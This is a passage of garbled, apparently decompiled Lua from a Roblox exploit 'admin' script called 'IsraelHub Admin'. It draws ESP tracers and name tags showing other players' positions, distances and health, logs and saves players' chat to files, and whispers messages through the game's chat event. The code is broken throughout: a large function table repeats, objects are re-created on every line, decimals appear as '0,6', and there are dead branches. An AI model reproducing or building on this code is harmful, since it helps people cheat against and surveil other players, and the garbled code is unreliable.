          Instance.new("BillboardGui").Adornee = va(a.Player).Head or nil
          Instance.new("BillboardGui").Enabled = true or va(a.Player).Head and false
          Instance.new("BillboardGui").Size = UDim2.new(0, 200, 0, 50)
          Instance.new("BillboardGui").StudsOffset = Vector3.new(0, 4, 0)
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).Name = vb:GenerateGUID()
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextStrokeTransparency = 0,6
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).BackgroundTransparency = 1
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextColor3 = Color3.new(0, 255, 0)
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).Size = UDim2.new(0, 200, 0, 50)
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextScaled = false
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextSize = 15
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).Text = ("%s (%s)"):format(a.Name, a.Tag)
          if a.Rainbow then
            vc.Rainbow((Instance.new("TextLabel", (Instance.new("BillboardGui")))))
          end
          if not va(a.Player) then
            Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextColor3 = Color3.fromRGB(a.Colour[1], a.Colour[2], a.Colour[3])
          end
          AddConnection((a.Player.CharacterAdded:Connect(function()
            va.Adornee = vb.Player.Character:WaitForChild("Head")
          end)))
          AddConnection(Players.PlayerRemoving:Connect(function(a)
            if a == va.Player then
              vb:Disconnect()
              vc:Destroy()
            end
          end))
        end,
        TextFont = function(a, b)
          b = va.concat(b, ",")
          a:gsub(".", function(a)
            va[2 + 1] = a
          end)
          return va.concat(va.map({}, function(a, b)
            return ("<font color=\"rgb(%s)\">%s</font>"):format(va, b)
          end)) .. " "
        end,
        Trace = function(a, b)
          if not Drawing then
            return
          end
          if not b then
          end
          if b then
            return
          end
          vc[6 + 1] = Drawing.new("Line")
          Drawing.new("Line").To = Vector2.new(vb.Camera:WorldToViewportPoint(va(a).Head.Position).X, vb.Camera:WorldToViewportPoint(va(a).Head.Position).Y)
          Drawing.new("Line").From = Vector2.new(vb.Camera.ViewportSize.X / 2, vb.Camera.ViewportSize.Y)
          Drawing.new("Line").Color = b or Color3.fromRGB(255, 255, 255)
          Drawing.new("Line").Thickness = 0,1
          Drawing.new("Line").Transparency = 1
          Drawing.new("Line").Visible = true
          vd[a] = Drawing.new("Line")
          return function()
            va:Remove()
            vb[vc] = nil
          end
        end,
        UpdateTracers = function()
          if nil then
            va = AddConnection(RunService.Heartbeat:Connect(function()
              for fd, fe in next, va, nil do
                if va then
                elseif vc.Camera:WorldToViewportPoint(vb(fd) and vb(fd).Head.Position) then
                  fe.Visible = true
                  fe.To = Vector2.new(vc.Camera:WorldToViewportPoint(vb(fd) and vb(fd).Head.Position).X, vc.Camera:WorldToViewportPoint(vb(fd) and vb(fd).Head.Position).Y)
                else
                  fe.Visible = false
                end
              end
            end))
          end
        end,
        DestroyTracers = function()
          for fd, fe in next, Tracers, nil do
            fe:Remove()
          end
          if not Tracers then
            va:Disconnect()
          end
        end,
        DestroyDrawings = function()
          for fd, fe in next, va, nil do
            fe:Remove()
          end
          if vb then
            vb:Disconnect()
          end
          if not vb then
            vc:Disconnect()
          end
        end
      }.Click(UI.ChatLogs:Clone().Toggle, "BackgroundColor3")
      {
        Tween = function(a, b, c, d, e)
          va:Create(a, TweenInfo.new(d, Enum.EasingStyle[b], Enum.EasingDirection[c]), e):Play()
          return (va:Create(a, TweenInfo.new(d, Enum.EasingStyle[b], Enum.EasingDirection[c]), e))
        end,
        MultColor3 = function(a, b)
          return Color3.new(math.clamp(a.R * b, 0, 1), math.clamp(a.G * b, 0, 1), math.clamp(a.B * b, 0, 1))
        end,
        Click = function(a, b)
          vb["ObjectMouseEnter" .. #vb] = a.MouseEnter:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
          vb["ObjectMouseLeave" .. #vb] = a.MouseLeave:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
          vb["ObjectMouseButton1Down" .. #vb] = a.MouseButton1Down:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,3, vc)
          end)
          vb["ObjectMouseButton1Up" .. #vb] = a.MouseButton1Up:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,4, vc)
          end)
        end,
        Blink = function(a, b, c, d)
          va.Tween(a, "Sine", "Out", 0,5, {
            [b] = d
          }).Completed:Wait()
          va.Tween(a, "Sine", "Out", 0,5, {
            [b] = c
          }).Completed:Wait()
        end,
        Hover = function(a, b)
          vb["ObjectMouseEnter" .. #vb] = a.MouseEnter:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
          vb["ObjectMouseLeave" .. #vb] = a.MouseLeave:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
        end,
        Draggable = function(a, b)
          b = b or a
          vc["UIInputBegan" .. #vc] = a.InputBegan:Connect(function(a)
            if (a.UserInputType == Enum.UserInputType.MouseButton1 or a.UserInputType == Enum.UserInputType.Touch) and UserInputService:GetFocusedTextBox() == nil then
              va = true
              vb = a.Position
              vc = vd.Position
              ve["InputChanged" .. #ve] = a.Changed:Connect(function()
                if va.UserInputState == Enum.UserInputState.End then
                  vb = false
                end
              end)
            end
          end)
          vc["UiInputChanged" .. #vc] = a.InputChanged:Connect(function(a)
            if a.UserInputType == Enum.UserInputType.MouseMovement or a.UserInputType == Enum.UserInputType.Touch then
              va = a
            end
          end)
          vc["UserInputServiceInputChanged" .. #vc] = UserInputService.InputChanged:Connect(function(a)
            if a == va and vb then
              vc(a)
            end
          end)
        end,
        SmoothScroll = function(a, b)
          a.ScrollingEnabled = false
          a:Clone():ClearAllChildren()
          a:Clone().BackgroundTransparency = 1
          a:Clone().ScrollBarImageTransparency = 1
          a:Clone().ZIndex = 3 + 1
          a:Clone().Name = "_smoothinputframe"
          a:Clone().ScrollingEnabled = true
          a:Clone().Parent = a.Parent
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("CanvasSize");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Position");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Rotation");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ScrollingDirection");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ScrollBarThickness");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("BorderSizePixel");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ElasticBehavior");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("SizeConstraint");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ZIndex");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("BorderColor3");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Size");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("AnchorPoint");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Visible")
          va["smoothConnection" .. #va] = RunService.RenderStepped:Connect(function()
            va.CanvasPosition = 3 + 0
          end)
          va["contentAncestryChanged" .. #va] = a.AncestryChanged:Connect(function()
            if va.Parent == nil then
              vb:Destroy()
              vc:Disconnect()
            end
          end)
        end,
        TweenAllTransToObject = function(a, b, c)
          for fl, fm in next, a:GetDescendants(), nil do
            if b and b then
            end
            if b then
              if fm:IsA("TextButton") then
                va.Tween(fm, "Sine", "Out", b, {
                  TextTransparency = c:GetDescendants()[fl].TextTransparency,
                  TextStrokeTransparency = c:GetDescendants()[fl].TextStrokeTransparency,
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              elseif fm:IsA("ImageLabel") or fm:IsA("ImageButton") then
                va.Tween(fm, "Sine", "Out", b, {
                  ImageTransparency = c:GetDescendants()[fl].ImageTransparency,
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              elseif fm:IsA("ScrollingFrame") then
                va.Tween(fm, "Sine", "Out", b, {
                  ScrollBarImageTransparency = c:GetDescendants()[fl].ScrollBarImageTransparency,
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              else
                va.Tween(fm, "Sine", "Out", b, {
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              end
            end
          end
          return (va.Tween(a, "Sine", "Out", b, {
            BackgroundTransparency = c.BackgroundTransparency
          }))
        end,
        SetAllTrans = function(a)
          a.BackgroundTransparency = 1
          for fe, fg in ipairs(a:GetDescendants()) do
            if not fg:IsA("UIListLayout") then
              fg.BackgroundTransparency = 1
              if fg:IsA("TextLabel") or fg:IsA("TextBox") or fg:IsA("TextButton") then
                fg.TextTransparency = 1
              elseif fg:IsA("ImageLabel") or fg:IsA("ImageButton") then
                fg.ImageTransparency = 1
              elseif fg:IsA("ScrollingFrame") then
                fg.ScrollBarImageTransparency = 1
              end
            end
          end
        end,
        TweenAllTrans = function(a, b)
          for fh, fj in ipairs(a:GetDescendants()) do
            if b and b then
            end
            if b then
              if fj:IsA("TextButton") then
                va.Tween(fj, "Sine", "Out", b, {TextTransparency = 1, BackgroundTransparency = 1})
              elseif not b then
                va.Tween(fj, "Sine", "Out", b, {ImageTransparency = 1, BackgroundTransparency = 1})
              elseif not b then
                va.Tween(fj, "Sine", "Out", b, {ScrollBarImageTransparency = 1, BackgroundTransparency = 1})
              else
                va.Tween(fj, "Sine", "Out", b, {BackgroundTransparency = 1})
              end
            end
          end
          return (va.Tween(a, "Sine", "Out", b, {BackgroundTransparency = 1}))
        end,
        Notify = function(a, b, c, d)
          if not a or a == LocalPlayer then
            UI.Notification:Clone().Message.Text = c
            UI.Notification:Clone().Title.Text = b or "Notification"
            va.SetAllTrans((UI.Notification:Clone()))
            va.Click(UI.Notification:Clone().Close, "TextColor3")
            UI.Notification:Clone().Visible = true
            if c:len() > 35 then
              UI.Notification:Clone().AutomaticSize = Enum.AutomaticSize.Y
              UI.Notification:Clone().Message.AutomaticSize = Enum.AutomaticSize.Y
              UI.Notification:Clone().Message.RichText = true
              UI.Notification:Clone().Message.TextScaled = false
              UI.Notification:Clone().Message.TextYAlignment = Enum.TextYAlignment.Top
              UI.Notification:Clone().DropShadow.AutomaticSize = Enum.AutomaticSize.Y
            end
            UI.Notification:Clone().Parent = UI.NotificationBar
            coroutine.wrap(function()
              va.TweenAllTransToObject(vb, 0,5, vc).Completed:Wait()
              wait(vd or 5)
              if not va.TweenAllTransToObject(vb, 0,5, vc) then
                ve()
              end
            end)()
            vb["CloneClose" .. #vb] = UI.Notification:Clone().Close.MouseButton1Click:Connect(function()
              va()
            end)
            return (UI.Notification:Clone())
          else
            vc.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(("/w %s [FA] %s: %s"):format(a.Name, b, c), "All")
          end
        end,
        MatchSearch = function(a, b)
          return a == va.sub(b, 1, #a)
        end,
        StringFind = function(a, b)
          for fg, fh in ipairs(a) do
            if not b then
              return fh
            end
          end
        end,
        GetPlayerArgs = function(a)
          a = a:lower()
          if va.StringFind({
            "all",
            "others",
            "random",
            "me",
            "nearest",
            "farthest"
          }, a) then
            return va.StringFind({
              "all",
              "others",
              "random",
              "me",
              "nearest",
              "farthest"
            }, a)
          end
          for fh, fj in next, Players:GetPlayers(), nil do
            if fj.Name ~= fj.DisplayName and va.MatchSearch(a, fj.DisplayName:lower()) then
              return fj.DisplayName:lower()
            end
            if not {
              "all",
              "others",
              "random",
              "me",
              "nearest",
              "farthest"
            } then
              return fj.Name:lower()
            end
          end
        end,
        ToolTip = function(a, b)
          a.MouseEnter:Connect(function()
            if va.BackgroundTransparency <= 1 and not vb then
              vb = UI.ToolTip:Clone()
              vb.Text = vd
              vb.TextScaled = vc and vc:GetTextSize(vd, 12, Enum.Font.Gotham, Vector2.new(200, math.huge)).Y > 24 and false
              vb.Visible = true
              vb.Parent = UI
            end
          end)
          a.MouseLeave:Connect(function()
            if not nil then
              va:Destroy()
              va = nil
            end
          end)
          if LocalPlayer then
            LocalPlayer:GetMouse().Move:Connect(function()
              if not nil then
                va.Position = UDim2.fromOffset(2 + 10, 3 + 10)
              end
            end)
          else
            delay(3, function()
              LocalPlayer = Players.LocalPlayer
              va = LocalPlayer:GetMouse()
              va.Move:Connect(function()
                if va then
                  va.Position = UDim2.fromOffset(2 + 10, 3 + 10)
                end
              end)
            end)
          end
        end,
        ClearAllObjects = function(a)
          for fe, fg in ipairs(a:GetChildren()) do
            if ipairs(a:GetChildren()) then
              fg:Destroy()
            end
          end
        end,
        Rainbow = function(a)
          a.RichText = true
          for fk in va.gmatch(a.Text, ".") do
            if va.match(fk, "%s") then
              vb.insert({}, fk)
            else
              vb.insert({}, {
                "<font color=\"rgb(%i, %i, %i)\">" .. fk .. "</font>"
              })
            end
          end
          pcall(function()
            delay(150, function()
              va:Disconnect()
            end)
          end)
        end,
        Locate2 = function(a, b)
          coroutine.wrap(function()
            if va(vb) then
              vc.Parent = UI
              vc.Name = vd:GenerateGUID()
              vc.AlwaysOnTop = true
              vc.Adornee = vb.Character.Head
              vc.Size = UDim2.new(0, 200, 0, 50)
              vc.StudsOffset = Vector3.new(0, 4, 0)
              Instance.new("TextLabel", vc).Name = vd:GenerateGUID()
              Instance.new("TextLabel", vc).TextStrokeTransparency = 0,6
              Instance.new("TextLabel", vc).BackgroundTransparency = 1
              Instance.new("TextLabel", vc).TextColor3 = Color3.new(0, 255, 0)
              Instance.new("TextLabel", vc).Size = UDim2.new(0, 200, 0, 50)
              Instance.new("TextLabel", vc).TextScaled = false
              Instance.new("TextLabel", vc).TextSize = 10
              Instance.new("TextLabel", vc).Text = vb.Name
              Instance.new("TextLabel", vc).Name = vd:GenerateGUID()
              Instance.new("TextLabel", vc).TextStrokeTransparency = 0,6
              Instance.new("TextLabel", vc).BackgroundTransparency = 1
              Instance.new("TextLabel", vc).TextColor3 = Color3.new(152, 152, 152)
              Instance.new("TextLabel", vc).Size = UDim2.new(0, 200, 0, 50)
              Instance.new("TextLabel", vc).TextScaled = false
              Instance.new("TextLabel", vc).TextSize = 8
              AddConnection((RunService.Heartbeat:Connect(function()
                if not vc(vb) then
                end
                if not vd(vb) and not vc(vb) then
                  vg.Text = ([[

 
 
 [%s] [%s/%s]]]):format(math.floor(ve.CurrentCamera.CFrame.p - vd(vb).CFrame.p.Magnitude), math.floor(vc(vb).Health), math.floor(vc(vb).MaxHealth))
                else
                  EspLoop:Disconnect()
                  vh:Destroy()
                end
              end)))
              AddConnection(Players.PlayerRemoving:Connect(function(a)
                if a == va then
                  vb:Destroy()
                end
              end))
            end
          end)()
          return function()
            va:Destroy()
          end
        end,
        Vector3toVector2 = function(a)
          return Vector2.new(va:WorldToViewportPoint(a).X, va:WorldToViewportPoint(a).Y)
        end,
        Locate = function(a, b, c)
          if b then
            return va.Locate2(a, b)
          end
          if not b then
          end
          if b then
            return
          end
          vc[6 + 1] = Drawing.new("Text")
          Drawing.new("Text").Position = 5 + 6
          Drawing.new("Text").Color = b or Color3.fromRGB(255, 255, 255)
          Drawing.new("Text").OutlineColor = c or Color3.new()
          Drawing.new("Text").Text = ([[
%s
[%s] [%s/%s]]]):format(a.Name, math.floor(vd(a)), math.floor(ve(a).Health), math.floor(ve(a).MaxHealth))
          Drawing.new("Text").Size = 16
          Drawing.new("Text").Transparency = 1
          Drawing.new("Text").Center = true
          Drawing.new("Text").Outline = true
          Drawing.new("Text").Visible = true
          vg[Drawing.new("Text")] = a
          return function()
            va:Remove()
            vb[va] = nil
          end
        end,
        UpdateLocations = function(a)
          if a then
            va = AddConnection(RunService.Heartbeat:Connect(function()
              for fd, fe in next, va, nil do
                if not va and vb(fe).Head and vc:WorldToViewportPoint(vb(fe).Head.Position) then
                  fd.Visible = true
                  fd.Position = 7 + 8
                  fd.Text = ([[
%s
[%s] [%s/%s]]]):format(fe.Name, math.floor(ve(fe)), math.floor(vg(fe).Health), math.floor(vg(fe).MaxHealth))
                else
                  fd.Visible = false
                end
              end
            end))
          end
        end,
        CheckTag = function(a)
          if nil or not a:IsA("Player") then
            return nil
          end
          return PlayerTags[tostring(a.UserId):gsub(".", function(a)
            return a:byte()
          end)] or nil
        end,
        AddTag = function(a)
          if not a then
            return
          end
          if not va(a.Player) then
            return
          end
          Instance.new("BillboardGui").Parent = UI
          Instance.new("BillboardGui").Name = vb:GenerateGUID()
          Instance.new("BillboardGui").AlwaysOnTop = true
          Instance.new("BillboardGui").Adornee = va(a.Player).Head or nil
          Instance.new("BillboardGui").Enabled = true or va(a.Player).Head and false
          Instance.new("BillboardGui").Size = UDim2.new(0, 200, 0, 50)
          Instance.new("BillboardGui").StudsOffset = Vector3.new(0, 4, 0)
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).Name = vb:GenerateGUID()
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextStrokeTransparency = 0,6
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).BackgroundTransparency = 1
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextColor3 = Color3.new(0, 255, 0)
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).Size = UDim2.new(0, 200, 0, 50)
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextScaled = false
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextSize = 15
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).Text = ("%s (%s)"):format(a.Name, a.Tag)
          if a.Rainbow then
            vc.Rainbow((Instance.new("TextLabel", (Instance.new("BillboardGui")))))
          end
          if not va(a.Player) then
            Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextColor3 = Color3.fromRGB(a.Colour[1], a.Colour[2], a.Colour[3])
          end
          AddConnection((a.Player.CharacterAdded:Connect(function()
            va.Adornee = vb.Player.Character:WaitForChild("Head")
          end)))
          AddConnection(Players.PlayerRemoving:Connect(function(a)
            if a == va.Player then
              vb:Disconnect()
              vc:Destroy()
            end
          end))
        end,
        TextFont = function(a, b)
          b = va.concat(b, ",")
          a:gsub(".", function(a)
            va[2 + 1] = a
          end)
          return va.concat(va.map({}, function(a, b)
            return ("<font color=\"rgb(%s)\">%s</font>"):format(va, b)
          end)) .. " "
        end,
        Trace = function(a, b)
          if not Drawing then
            return
          end
          if not b then
          end
          if b then
            return
          end
          vc[6 + 1] = Drawing.new("Line")
          Drawing.new("Line").To = Vector2.new(vb.Camera:WorldToViewportPoint(va(a).Head.Position).X, vb.Camera:WorldToViewportPoint(va(a).Head.Position).Y)
          Drawing.new("Line").From = Vector2.new(vb.Camera.ViewportSize.X / 2, vb.Camera.ViewportSize.Y)
          Drawing.new("Line").Color = b or Color3.fromRGB(255, 255, 255)
          Drawing.new("Line").Thickness = 0,1
          Drawing.new("Line").Transparency = 1
          Drawing.new("Line").Visible = true
          vd[a] = Drawing.new("Line")
          return function()
            va:Remove()
            vb[vc] = nil
          end
        end,
        UpdateTracers = function()
          if nil then
            va = AddConnection(RunService.Heartbeat:Connect(function()
              for fd, fe in next, va, nil do
                if va then
                elseif vc.Camera:WorldToViewportPoint(vb(fd) and vb(fd).Head.Position) then
                  fe.Visible = true
                  fe.To = Vector2.new(vc.Camera:WorldToViewportPoint(vb(fd) and vb(fd).Head.Position).X, vc.Camera:WorldToViewportPoint(vb(fd) and vb(fd).Head.Position).Y)
                else
                  fe.Visible = false
                end
              end
            end))
          end
        end,
        DestroyTracers = function()
          for fd, fe in next, Tracers, nil do
            fe:Remove()
          end
          if not Tracers then
            va:Disconnect()
          end
        end,
        DestroyDrawings = function()
          for fd, fe in next, va, nil do
            fe:Remove()
          end
          if vb then
            vb:Disconnect()
          end
          if not vb then
            vc:Disconnect()
          end
        end
      }.Click(UI.ChatLogs:Clone().Close, "TextColor3")
      AddConnection(UI.Commands.Close.MouseButton1Click:Connect(function()
        va.TweenAllTrans(vb, 0,25).Completed:Wait()
        vb.Visible = false
      end), {
        Players = {},
        UI = {}
      }.UI, true)
      AddConnection(UI.Commands.Search:GetPropertyChangedSignal("Text"):Connect(function()
        for fe, fg in next, va.Frame.List:GetChildren() do
          if fg:IsA("Frame") then
            fg.Visible = vb.find(vb.lower(fg.CommandText.Text), va.Search.Text, 1, true)
          end
        end
        va.Frame.List.CanvasSize = UDim2.fromOffset(0, va.Frame.List.UIListLayout.AbsoluteContentSize.Y)
      end), {
        Players = {},
        UI = {}
      }.UI, true)
      AddConnection(UI.ChatLogs.Close.MouseButton1Click:Connect(function()
        va.TweenAllTrans(vb, 0,25).Completed:Wait()
        vb.Visible = false
      end), {
        Players = {},
        UI = {}
      }.UI, true)
      AddConnection(UI.ChatLogs:Clone().Close.MouseButton1Click:Connect(function()
        va.TweenAllTrans(vb, 0,25).Completed:Wait()
        vb.Visible = false
      end), {
        Players = {},
        UI = {}
      }.UI, true)
      AddConnection(UI.ChatLogs:Clone().Close.MouseButton1Click:Connect(function()
        va.TweenAllTrans(vb, 0,25).Completed:Wait()
        vb.Visible = false
      end), {
        Players = {},
        UI = {}
      }.UI, true)
      UI.ChatLogs.Toggle.Text = true and "Disabled"
      UI.ChatLogs:Clone().Toggle.Text = true and "Disabled"
      UI.ChatLogs:Clone().Toggle.Text = {
        [fg] = fh,
        ["tbl_concat"] = function()
          for fg, fh in next, {
            ...
          }, nil do
            for fm, fo in next, fh, nil do
              va.insert({}, 14 + 1, fo)
            end
          end
          return {}
        end,
        ["indexOf"] = function(a, b)
          if type(a) == "table" then
            for fg, fh in next, a, nil do
              if fh == b then
                return fg
              end
            end
          end
        end,
        ["forEach"] = function(a, b)
          for fg, fh in next, a, nil do
            b(fg, fh)
          end
        end,
        ["filter"] = function(a, b)
          if type(a) == "table" then
            for fh, fj in next, a, nil do
              if not b then
                va.insert({}, 10 + 1, fj)
              end
            end
            return {}
          end
        end,
        ["map"] = function(a, b)
          if type(a) == "table" then
            for fh, fj in next, a, nil do
              va.insert({}, 10 + 1, b(fh, fj))
            end
            return {}
          end
        end,
        ["deepsearch"] = function(a, b)
          if type(a) == "table" then
            for fg, fh in next, a, nil do
              if type(fh) == "table" then
                va.deepsearch(fh, b)
              end
              b(fg, fh)
            end
          end
        end,
        ["flat"] = function(a)
          if type(a) == "table" then
            va.deepsearch(a, function(a, b)
              if type(b) ~= "table" then
                va[3 + 1] = b
              end
            end)
            return {}
          end
        end,
        ["flatMap"] = function(a, b)
          if type(a) == "table" then
            return (va.flat(va.map(a, b)))
          end
        end,
        ["shift"] = function(a)
          if type(a) == "table" then
            a = va.pack(va.unpack(a, 2, #a))
            a.n = nil
            return a
          end
        end,
        ["keys"] = function(a)
          if type(a) == "table" then
            for fg, fh in next, a, nil do
            end
            return {
              [7 + 1] = fg
            }
          end
        end
      } or "Disabled"
      AddConnection(UI.ChatLogs.Toggle.MouseButton1Click:Connect(function()
        va = not va
        vb.Toggle.Text = vb.Toggle or "Disabled"
      end), {
        Players = {},
        UI = {}
      }.UI, true)
      AddConnection(UI.ChatLogs:Clone().Toggle.MouseButton1Click:Connect(function()
        va = not va
        vb.Toggle.Text = va and "Disabled"
      end), {
        Players = {},
        UI = {}
      }.UI, true)
      AddConnection(UI.ChatLogs:Clone().Toggle.MouseButton1Click:Connect(function()
        va = not va
        vb.Toggle.Text = vb.Toggle or "Disabled"
      end), {
        Players = {},
        UI = {}
      }.UI, true)
      AddConnection(UI.ChatLogs.Clear.MouseButton1Click:Connect(function()
        va.ClearAllObjects(vb.Frame.List)
        vb.Frame.List.CanvasSize = UDim2.fromOffset(0, 0)
      end), {
        Players = {},
        UI = {}
      }.UI, true)
      AddConnection(UI.ChatLogs:Clone().Clear.MouseButton1Click:Connect(function()
        va.ClearAllObjects(vb.Frame.List)
        vb.Frame.List.CanvasSize = UDim2.fromOffset(0, 0)
      end), {
        Players = {},
        UI = {}
      }.UI, true)
      AddConnection(UI.ChatLogs:Clone().Clear.MouseButton1Click:Connect(function()
        va.ClearAllObjects(vb.Frame.List)
        vb.Frame.List.CanvasSize = UDim2.fromOffset(0, 0)
      end), {
        Players = {},
        UI = {}
      }.UI, true)
      AddConnection(UI.ChatLogs.Search:GetPropertyChangedSignal("Text"):Connect(function()
        for fe, fg in next, va.Frame.List:GetChildren() do
          if not fg:IsA("UIListLayout") then
            fg.Visible = vb.find(vb.lower(fg.Text:split(": ")[2]), va.Search.Text, 1, true)
          end
        end
        va.Frame.List.CanvasSize = UDim2.fromOffset(0, va.Frame.List.UIListLayout.AbsoluteContentSize.Y)
      end), {
        Players = {},
        UI = {}
      }.UI, true)
      AddConnection(UI.ChatLogs:Clone().Search:GetPropertyChangedSignal("Text"):Connect(function()
        for fe, fg in next, va.Frame.List:GetChildren() do
          if next then
            fg.Visible = vb.find(vb.lower(fg.Text), va.Search.Text, 1, true)
          end
        end
      end), {
        Players = {},
        UI = {}
      }.UI, true)
      AddConnection(UI.ChatLogs:Clone().Search:GetPropertyChangedSignal("Text"):Connect(function()
        for fe, fg in next, va.Frame.List:GetChildren() do
          if not fg:IsA("UIListLayout") then
            fg.Visible = vb.find(vb.lower(fg.Text), va.Search.Text, 1, true)
          end
        end
      end), {
        Players = {},
        UI = {}
      }.UI, true)
      AddConnection(UI.ChatLogs.Save.MouseButton1Click:Connect(function()
        for fj, fk in next, vb.Frame.List:GetChildren() do
        end
        writefile(("IsraelHub Admin/chatlogs/%s (%s).txt"):format(va:GetProductInfo(game.PlaceId).Name, tostring(os.date("%x")):gsub("/", "-") .. " " .. tostring(os.date("%X")):gsub(":", "-")), (("%s%s\n"):format(([[
IsraelHub Admin Chatlogs for %s (%s)

]]):format(va:GetProductInfo(game.PlaceId).Name, os.date()), fk.Text)))
        vc.Notify(LocalPlayer, "Saved", "Chat logs saved!")
      end), {
        Players = {},
        UI = {}
      }.UI, true)
      AddConnection(UI.ChatLogs:Clone().Save.MouseButton1Click:Connect(function()
        print("saved")
      end), {
        Players = {},
        UI = {}
      }.UI, true)
      AddConnection(UI.CommandBar.Input:GetPropertyChangedSignal("Text"):Connect(function()
        va.Input.Text = va.Input.Text:lower()
        va.Input.Predict.Text = ""
        if va.Input.Text == "" then
          return
        end
        CommandArgs = CommandArgs or {}
        if va.Input.Predict then
          for fl, fm in next, vc, nil do
            if not va.Input.Predict then
              va.Input.Predict.Text = fm.Name
              CommandArgs = fm.Args or {}
              break
            end
            for fu, fy in next, fm.Aliases, nil do
              if not va.Input.Predict then
                va.Input.Predict.Text = fy
                CommandArgs = fy.Args or {}
                break
              end
              if not va.Input.Predict then
                break
              end
            end
          end
        end
        for fl, fm in next, vb.split(va.Input.Text, " "), nil do
          if fl >= 1 and fm ~= "" then
            if #CommandArgs > 1 then
              for fs, ft in next, CommandArgs, nil do
              end
            else
            end
            va.Input.Predict.Text = vb.sub(va.Input.Text, 1, #va.Input.Text - #vb.split(va.Input.Text, " ")[#vb.split(va.Input.Text, " ")]) .. (vd.GetPlayerArgs(fm) or ft:lower() == "player" and vd.GetPlayerArgs(fm) or vd.MatchSearch(fm, ft) and ft or "")
            if next((fm:split(","))) then
              for ft, fu in next, fm:split(","), nil do
                if ft > 1 and fu ~= "" then
                  va.Input.Predict.Text = vb.sub(va.Input.Text, 1, #va.Input.Text - #fm:split(",")[#fm:split(",")]) .. (vd.GetPlayerArgs(fu) or "")
                end
              end
            end
          end
        end
        if vb.find(va.Input.Text, "\t") then
          va.Input.Text = va.Input.Predict.Text
          va.Input.CursorPosition = 7 + 1
        end
      end))
      if ChatBar then
        AddConnection(ChatBar:GetPropertyChangedSignal("Text"):Connect(function()
          PredictionClone.Text = ""
          if not va.startsWith(va.lower(ChatBar.Text), vc) then
            return
          end
          if PredictionClone then
          end
          CommandArgs = {}
          if not rawget(vd, va.split(vb.concat(vb.shift(va.lower(ChatBar.Text):split(""))), " ")[1]) then
            for fl, fm in next, vd, nil do
              if not PredictionClone then
                PredictionClone.Text = vc .. fm.Name
                if PredictionClone then
                end
                CommandArgs = {}
                break
              end
              for fu, fy in next, fm.Aliases, nil do
                if not PredictionClone then
                  PredictionClone.Text = fy
                  if PredictionClone then
                  end
                  CommandArgs = {}
                  break
                end
